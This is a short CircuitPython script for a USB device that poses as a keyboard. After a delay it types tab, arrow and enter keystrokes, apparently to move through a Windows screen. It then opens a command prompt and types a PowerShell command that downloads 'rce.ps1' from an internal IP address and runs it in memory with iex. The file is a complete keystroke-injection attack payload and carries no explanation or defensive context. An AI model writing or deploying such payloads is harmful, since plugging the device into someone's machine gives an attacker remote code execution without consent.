import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

import usb_hid
from adafruit_hid.mouse import Mouse

mouse = Mouse(usb_hid.devices)
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)


def tap(keycode):
    keyboard.press(keycode)
    time.sleep(.005)
    keyboard.release(keycode)
    time.sleep(0.05)

def delay(delay):
    def func():
        time.sleep(delay)
    return func

def type(keys):
    def func():
        if isinstance(keys, str):
            layout.write(keys)
        else:
            for k in keys:
                tap(k)
    return func

ops = [
    delay(10),
    type([
        Keycode.TAB,
        Keycode.TAB,
        Keycode.TAB,
        Keycode.TAB,
        Keycode.TAB,
        Keycode.LEFT_ARROW,
        Keycode.ENTER,
    ]),
    delay(1),
    type([
        Keycode.TAB,
        Keycode.TAB,
        Keycode.TAB,
        Keycode.TAB,
        Keycode.ENTER,
    ]),
    delay(0.2),
    type('cmd\n'),
    delay(2),
    type('powershell -c "iex (New-Object Net.WebClient).DownloadString(\'http://10.0.100.144/rce.ps1\')"\n')
]

for op in ops:
    op()
